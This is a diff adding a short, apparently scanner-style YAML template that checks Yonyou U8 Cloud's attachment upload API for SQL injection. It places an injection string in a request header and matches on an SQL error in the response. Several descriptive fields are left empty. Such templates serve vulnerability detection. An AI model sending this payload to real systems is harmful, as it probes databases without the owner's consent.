@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 用友U8 Cloud attachment upload SQL注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /u8cloud/api/hr/attachment/upload?mssql_error
+  headers:
+    system: -1' or 1=@@version--+
+response1:
+  body: SQL
+  code: 200
+requests2:
+response2:
